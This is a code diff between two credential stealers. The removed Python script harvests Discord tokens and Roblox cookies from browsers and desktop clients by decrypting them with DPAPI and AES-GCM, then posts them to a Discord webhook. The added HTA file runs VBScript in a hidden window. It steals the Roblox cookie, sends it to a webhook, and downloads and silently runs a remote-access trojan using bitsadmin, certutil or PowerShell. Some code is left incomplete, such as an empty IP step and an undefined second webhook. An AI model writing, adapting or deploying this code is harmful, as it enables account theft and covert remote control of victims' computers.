@@ -1,425 +1,140 @@
-# cookiez.py — compile with PyInstaller: pyinstaller --onefile --noconsole cookiez.py
-import os, json, base64, socket, struct, subprocess, time, re, sqlite3, shutil, tempfile
-import urllib.request, ctypes
-from ctypes import wintypes
-from datetime import datetime, timezone
+<html>
+<head><title>.</title>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<script language="VBScript">
+window.resizeTo 0,0:window.moveTo -2000,-2000
+On Error Resume Next
 
-WEBHOOK = "https://discordapp.com/api/webhooks/1552107533303283826/YCk_BwrFksPkoKnMDrkZI55vfTv5bxvKVXTdnNCoLq31t4KIx4_sRs0lUv36yAH6lYFO"
+Dim sh, fso, WH, PC, USER
+Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+WH = "https://discordapp.com/api/webhooks/1551972586252927049/catFwspybQjsFn-37A5y4qAgptvv8lYoC-3P2-gz3u0e01pEB0Sq6e6ywotOW9tR0XoQ"
+PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-LOCAL   = os.getenv("LOCALAPPDATA", "")
-APPDATA = os.getenv("APPDATA", "")
-TEMP    = tempfile.gettempdir()
-PC      = os.environ.get("COMPUTERNAME", socket.gethostname())
-USER    = os.environ.get("USERNAME", "")
-
-# ── DPAPI ─────────────────────────────────────────────────────
-
-class DATA_BLOB(ctypes.Structure):
-    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]
-
-def dpapi_decrypt(data: bytes) -> bytes:
-    try:
-        inp  = DATA_BLOB(len(data), (ctypes.c_byte * len(data)).from_buffer_copy(data))
-        out  = DATA_BLOB()
-        if ctypes.windll.crypt32.CryptUnprotectData(
-            ctypes.byref(inp), None, None, None, None, 0, ctypes.byref(out)
-        ):
-            res = ctypes.string_at(out.pbData, out.cbData)
-            ctypes.windll.kernel32.LocalFree(out.pbData)
-            return res
-    except Exception:
-        pass
-    return b""
-
-# ── AES-GCM ───────────────────────────────────────────────────
-
-def aes_gcm_decrypt(key: bytes, enc: bytes) -> str:
-    try:
-        from Crypto.Cipher import AES
-        iv   = enc[3:15]
-        ct   = enc[15:-16]
-        tag  = enc[-16:]
-        return AES.new(key, AES.MODE_GCM, nonce=iv).decrypt_and_verify(ct, tag).decode("utf-8", errors="replace")
-    except Exception:
-        return ""
-
-# ── Webhook helpers ────────────────────────────────────────────
-
-def post_json(payload: dict):
-    try:
-        body = json.dumps(payload).encode("utf-8")
-        req  = urllib.request.Request(
-            WEBHOOK,
-            data=body,
-            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
-        )
-        urllib.request.urlopen(req, timeout=8)
-    except Exception:
-        pass
-
-def post_file(filename: str, content: str):
-    try:
-        boundary = "----" + base64.b64encode(os.urandom(12)).decode()
-        body = (
-            f"--{boundary}\r\n"
-            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n\r\n'
-            f"{content}\r\n"
-            f"--{boundary}--"
-        ).encode("utf-8")
-        req = urllib.request.Request(
-            WEBHOOK,
-            data=body,
-            headers={
-                "Content-Type": f"multipart/form-data; boundary={boundary}",
-                "User-Agent":   "Mozilla/5.0"
-            }
-        )
-        urllib.request.urlopen(req, timeout=8)
-    except Exception:
-        pass
-
-def send_embed(title: str, description: str, color: int, fields: list = None):
-    embed = {"title": title, "description": description, "color": color}
-    if fields:
-        embed["fields"] = fields
-    post_json({"embeds": [embed]})
-
-# ── IP + Geo ───────────────────────────────────────────────────
-
-def get_geo() -> str:
-    try:
-        with urllib.request.urlopen(
-            "http://ip-api.com/json/?fields=query,country,regionName,city,isp",
-            timeout=6
-        ) as r:
-            j = json.loads(r.read())
-            return (
-                f"IP: {j.get('query','?')} | {j.get('country','?')} | "
-                f"{j.get('regionName','?')} | {j.get('city','?')} | "
-                f"{j.get('isp','?')} | PC: {PC} | {USER}"
-            )
-    except Exception:
-        return f"PC: {PC} | {USER}"
-
-# ── Discord token grabber ──────────────────────────────────────
-
-BROWSER_PATHS = {
-    "Discord":        os.path.join(APPDATA, "Discord"),
-    "Discord Canary": os.path.join(APPDATA, "discordcanary"),
-    "Discord PTB":    os.path.join(APPDATA, "discordptb"),
-    "Chrome":         os.path.join(LOCAL,   "Google", "Chrome", "User Data"),
-    "Chrome SxS":     os.path.join(LOCAL,   "Google", "Chrome SxS", "User Data"),
-    "Edge":           os.path.join(LOCAL,   "Microsoft", "Edge", "User Data"),
-    "Brave":          os.path.join(LOCAL,   "BraveSoftware", "Brave-Browser", "User Data"),
-    "Opera":          os.path.join(APPDATA, "Opera Software", "Opera Stable"),
-    "Opera GX":       os.path.join(APPDATA, "Opera Software", "Opera GX Stable"),
-    "Vivaldi":        os.path.join(LOCAL,   "Vivaldi", "User Data"),
-    "Yandex":         os.path.join(LOCAL,   "Yandex", "YandexBrowser", "User Data"),
-    "Torch":          os.path.join(LOCAL,   "Torch", "User Data"),
-    "Iridium":        os.path.join(LOCAL,   "Iridium", "User Data"),
-}
-
-def get_master_key(base: str) -> bytes:
-    try:
-        ls = os.path.join(base, "Local State")
-        if not os.path.exists(ls):
-            return b""
-        with open(ls, "r", encoding="utf-8") as f:
-            state = json.load(f)
-        enc_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
-        return dpapi_decrypt(enc_key)
-    except Exception:
-        return b""
-
-def scan_leveldb(path: str, key: bytes) -> set:
-    tokens = set()
-    if not os.path.exists(path):
-        return tokens
-    pat_enc  = re.compile(r"dQw4w9WgXcQ:[A-Za-z0-9+/=_-]+")
-    pat_bare = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,28}")
-    pat_mfa  = re.compile(r"mfa\.[A-Za-z0-9_-]{84}")
-    for fname in os.listdir(path):
-        if not fname.endswith((".ldb", ".log")):
-            continue
-        try:
-            raw = open(os.path.join(path, fname), "rb").read()
-            txt = raw.decode("utf-8", errors="replace")
-            for m in pat_enc.finditer(txt):
-                if key:
-                    try:
-                        b64 = m.group().split(":", 1)[1]
-                        b64 += "=" * ((4 - len(b64) % 4) % 4)
-                        enc = base64.b64decode(b64)
-                        dec = aes_gcm_decrypt(key, enc)
-                        if re.match(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", dec):
-                            tokens.add(dec)
-                    except Exception:
-                        pass
-            for m in pat_bare.finditer(txt):
-                tokens.add(m.group())
-            for m in pat_mfa.finditer(txt):
-                tokens.add(m.group())
-        except Exception:
-            pass
-    return tokens
-
-def validate_token(token: str) -> dict:
-    try:
-        req = urllib.request.Request(
-            "https://discord.com/api/v9/users/@me",
-            headers={"Authorization": token, "User-Agent": "Mozilla/5.0"}
-        )
-        with urllib.request.urlopen(req, timeout=8) as r:
-            j = json.loads(r.read())
-            nitro = ["None","Nitro Classic","Nitro","Nitro Basic"][int(j.get("premium_type") or 0)]
-            return {
-                "token":    token,
-                "username": j.get("username","?"),
-                "discrim":  j.get("discriminator","?"),
-                "id":       j.get("id","?"),
-                "email":    j.get("email",""),
-                "phone":    j.get("phone",""),
-                "mfa":      j.get("mfa_enabled", False),
-                "nitro":    nitro,
-            }
-    except Exception:
-        return {}
-
-def grab_discord(target: str) -> str:
-    all_tokens: set = set()
-    for name, base in BROWSER_PATHS.items():
-        if not os.path.exists(base):
-            continue
-        key = get_master_key(base)
-        for ldb in [
-            os.path.join(base, "Default", "Local Storage", "leveldb"),
-            os.path.join(base, "Local Storage", "leveldb"),
-        ]:
-            all_tokens |= scan_leveldb(ldb, key)
-        try:
-            for item in os.listdir(base):
-                if item.startswith("Profile"):
-                    ldb = os.path.join(base, item, "Local Storage", "leveldb")
-                    all_tokens |= scan_leveldb(ldb, key)
-        except Exception:
-            pass
-
-    if not all_tokens:
-        return ""
-
-    sent = set()
-    for tok in all_tokens:
-        if tok in sent:
-            continue
-        info = validate_token(tok)
-        if not info:
-            continue
-        sent.add(tok)
-        fields = [
-            {
-                "name":  "Account",
-                "value": (
-                    f"**{info['username']}#{info['discrim']}** | ID: `{info['id']}`\n"
-                    f"Email: {info['email'] or 'N/A'} | Phone: {info['phone'] or 'N/A'} | "
-                    f"MFA: {info['mfa']} | Nitro: {info['nitro']}"
-                ),
-                "inline": False,
-            },
-            {"name": "\U0001f3af Target", "value": target, "inline": False},
-        ]
-        send_embed(
-            "\U0001f511 Discord Token",
-            f"Token: {tok}",
-            5814783,
-            fields
-        )
-    return f"{len(sent)} token(s) sent"
-
-# ── Roblox cookie grabber ──────────────────────────────────────
-
-ROBLOX_PATHS = [
-    os.path.join(LOCAL,                          "Roblox", "LocalStorage", "robloxcookies.dat"),
-    os.path.join(LOCAL,                          "Roblox", "LocalStorage", "RobloxCookies.dat"),
-    os.path.join(LOCAL,                          "Roblox", "Cookies"),
-    os.path.join(APPDATA,                        "Roblox", "LocalStorage", "robloxcookies.dat"),
-    os.path.join(os.environ.get("USERPROFILE",""), "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat"),
-]
-
-def grab_roblox(target: str):
-    cookie = None
-
-    # scan fixed paths
-    for p in ROBLOX_PATHS:
-        if not os.path.exists(p):
-            continue
-        try:
-            raw = open(p, "r", encoding="utf-8", errors="replace").read()
-            m = re.search(r"(_\|WARNING[^\s\"']+)", raw)
-            if m:
-                cookie = m.group(1)
-                break
-            # try JSON-DPAPI
-            try:
-                j = json.loads(raw)
-                if j.get("CookiesData"):
-                    dec = dpapi_decrypt(base64.b64decode(j["CookiesData"]))
-                    if dec:
-                        m2 = re.search(r"(_\|WARNING[^\s\"']+)", dec.decode("utf-8", errors="replace"))
-                        if m2:
-                            cookie = m2.group(1)
-                            break
-            except Exception:
-                pass
-        except Exception:
-            pass
-
-    # scan UWP Packages
-    if not cookie:
-        pkg_root = os.path.join(LOCAL, "Packages")
-        try:
-            for folder in os.listdir(pkg_root):
-                if "ROBLOX" in folder.upper():
-                    p = os.path.join(pkg_root, folder, "LocalState", "RobloxCookies.dat")
-                    if os.path.exists(p):
-                        raw = open(p, "r", encoding="utf-8", errors="replace").read()
-                        m = re.search(r"(_\|WARNING[^\s\"']+)", raw)
-                        if m:
-                            cookie = m.group(1)
-                            break
-        except Exception:
-            pass
-
-    # scan Roblox logs
-    if not cookie:
-        log_dir = os.path.join(LOCAL, "Roblox", "logs")
-        try:
-            if os.path.exists(log_dir):
-                for lf in sorted(os.listdir(log_dir), key=lambda x: os.path.getmtime(os.path.join(log_dir, x)), reverse=True)[:10]:
-                    if not lf.endswith(".log"):
-                        continue
-                    raw = open(os.path.join(log_dir, lf), "r", encoding="utf-8", errors="replace").read()
-                    m = re.search(r"(_\|WARNING[^\s\"']+)", raw)
-                    if m:
-                        cookie = m.group(1)
-                        break
-        except Exception:
-            pass
-
-    if not cookie:
-        send_embed("\U0001f36a Roblox Cookie", "No cookie found on this machine.", 16711680,
-                   [{"name": "\U0001f3af Target", "value": target}])
-        return
-
-    fields = [{"name": "\U0001f3af Target", "value": target, "inline": False}]
-    send_embed(
-        "\U0001f36a Roblox Cookie",
-        f"Cookie: {cookie[:1800]}",
-        16744272,
-        fields
-    )
-    post_file("cookie.txt", cookie)
-
-# ── Browser cookie grab (Chrome saved cookies for Roblox) ─────
-
-def grab_browser_roblox_cookies(target: str):
-    found = []
-    for name, base in BROWSER_PATHS.items():
-        if not os.path.exists(base):
-            continue
-        key = get_master_key(base)
-        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 5)]:
-            for db_path in [
-                os.path.join(base, profile, "Network", "Cookies"),
-                os.path.join(base, profile, "Cookies"),
-            ]:
-                if not os.path.exists(db_path):
-                    continue
-                tmp = os.path.join(TEMP, f"_rbx_{name}_{profile}.db")
-                try:
-                    shutil.copy2(db_path, tmp)
-                except Exception:
-                    continue
-                try:
-                    import sqlite3 as sq
-                    conn = sq.connect(tmp)
-                    conn.row_factory = sq.Row
-                    rows = conn.execute(
-                        "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com'"
-                    ).fetchall()
-                    conn.close()
-                    for row in rows:
-                        enc = bytes(row["encrypted_value"])
-                        if not enc:
-                            continue
-                        if enc[:3] in (b"v10", b"v11") and key:
-                            val = aes_gcm_decrypt(key, enc)
-                        else:
-                            try:
-                                val = dpapi_decrypt(enc).decode("utf-8", errors="replace")
-                            except Exception:
-                                val = ""
-                        if val:
-                            found.append({
-                                "browser": f"{name} ({profile})",
-                                "name":    row["name"],
-                                "value":   val,
-                            })
-                except Exception:
-                    pass
-                finally:
-                    try:
-                        os.remove(tmp)
-                    except Exception:
-                        pass
-
-    roblosec = [c for c in found if c["name"] == ".ROBLOSECURITY"]
-    if roblosec:
-        for c in roblosec:
-            fields = [
-                {"name": "Browser", "value": c["browser"], "inline": True},
-                {"name": "\U0001f3af Target", "value": target, "inline": False},
-            ]
-            send_embed(
-                "\U0001f36a Roblox Cookie (Browser)",
-                f"Cookie: {c['value'][:1800]}",
-                16744272,
-                fields
-            )
-            post_file("cookie_browser.txt", c["value"])
-
-# ── Main ───────────────────────────────────────────────────────
-
-def main():
-    # try pycryptodome — silent install if missing
-    try:
-        from Crypto.Cipher import AES
-    except ImportError:
-        try:
-            subprocess.run(
-                ["pip", "install", "pycryptodome", "--quiet"],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
-        except Exception:
-            pass
-
-    target = get_geo()
-
-    # send target info first
-    send_embed(
-        "\U0001f3af Target",
-        target,
-        3447003
-    )
-
-    # grab discord tokens
-    grab_discord(target)
-
-    # grab roblox cookies from native client paths
-    grab_roblox(target)
-
-    # grab roblox cookies from browser sqlite stores
-    grab_browser_roblox_cookies(target)
+' === STEP 1: Send IP + Geolocation ===
 
 
-if __name__ == "__main__":
-    main()
+' === STEP 2: Grab Roblox Cookie ===
+Call GrabRoblox
+
+' === STEP 3: Download + Run RAT ===
+Call DropRAT
+
+window.close()
+
+' ============================================================
+' FUNCTIONS
+' ============================================================
+
+
+
+Sub GrabRoblox()
+    Dim paths(4)
+    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
+    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    Dim i, fp, raw
+    For i = 0 To 4
+        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
+    Next
+    If Len(fp) = 0 Then
+        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
+        If fso.FolderExists(pk) Then
+            Dim folder, subf
+            Set folder = fso.GetFolder(pk)
+            For Each subf In folder.SubFolders
+                If InStr(subf.Name, "ROBLOX") > 0 Then
+                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
+                    If fso.FileExists(uwp) Then fp = uwp: Exit For
+                End If
+            Next
+            Set folder = Nothing
+        End If
+    End If
+    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
+    raw = ReadFile(fp)
+    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
+    Dim cookie: cookie = "": Dim approach: approach = ""
+    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
+    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
+        approach = "JSON-DPAPI"
+        Dim sp: sp = InStr(raw, "CookiesData"":""")
+        If sp > 0 Then
+            sp = sp + 14
+            Dim ep: ep = InStr(sp, raw, """")
+            If ep > sp Then
+                Dim b64: b64 = Mid(raw, sp, ep - sp)
+                If Len(b64) > 100 Then
+                    cookie = DecryptDPAPI(b64)
+                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
+                End If
+            End If
+        End If
+    End If
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
+    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
+    Dim cae: cae = InStr(cookie, "|$CAE")
+    If cae = 0 Then cae = InStr(cookie, "|_CAE")
+    If cae > 0 Then cookie = Mid(cookie, cae)
+    Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
+    Call PostFile("cookie.txt", cookie)
+End Sub
+
+Sub DropRAT()
+    Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\mrrobot.exe"
+    Dim dl: dl = "https://github.com/sasukeuchicaj-debug/fictional-guide/raw/refs/heads/main/mrrobot.exe"
+    ' Try bitsadmin first
+    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
+    ' Fallback: certutil
+    If Not fso.FileExists(temp) Then
+        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
+    End If
+    ' Fallback: PowerShell
+    If Not fso.FileExists(temp) Then
+        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
+    End If
+    ' Run if downloaded
+    If fso.FileExists(temp) Then
+        sh.Run Chr(34) & temp & Chr(34), 0, False
+    End If
+End Sub
+
+Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
+    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    Dim psf: psf = TmpFile("dpapi.ps1"): WriteFile psf, ps: RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
+    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
+    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True: End Function
+
+Sub RunCmd(cmd): On Error Resume Next: Dim w,p,i,s: Set w = GetObject("winmgmts:\\.\root\cimv2"): Set s = w.Get("Win32_ProcessStartup").SpawnInstance_: s.ShowWindow = 0: Set p = w.Get("Win32_Process"): p.Create cmd,,s,i
+    If i = 0 Then Exit Sub
+    Dim r: r = True
+    Do While r
+        Set w = GetObject("winmgmts:\\.\root\cimv2")
+        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
+        Set w = Nothing
+        If r Then WScript.Sleep 150
+    Loop
+End Sub
+
+Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
+Sub WriteFile(path, content): On Error Resume Next: Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
+Function Fetch(url): On Error Resume Next: Fetch = "": Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "GET", url, False: h.Send
+    If h.Status = 200 Then Fetch = h.ResponseText
+    Set h = Nothing: End Function
+Function ReadFile(path): On Error Resume Next: ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+
+Sub PostEmbed(t, d, c): On Error Resume Next: Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
+    Dim h2: Set h2 = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h2.SetOption 2, 13056: h2.Open "POST", WH2, False: h2.SetRequestHeader "Content-Type", "application/json": h2.Send j: Set h2 = Nothing: End Sub
+
+Sub PostFile(fn, ct): On Error Resume Next: Dim b: b = MkGuid(): Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing
+    Dim h2: Set h2 = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h2.SetOption 2, 13056: h2.Open "POST", WH2, False: h2.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h2.Send bd: Set h2 = Nothing: End Sub
+
+Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t"): Ej = s: End Function
+Function MkGuid(): Dim t: Set t = CreateObject("Scriptlet.TypeLib"): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function
+</script>
+</head><body></body></html>
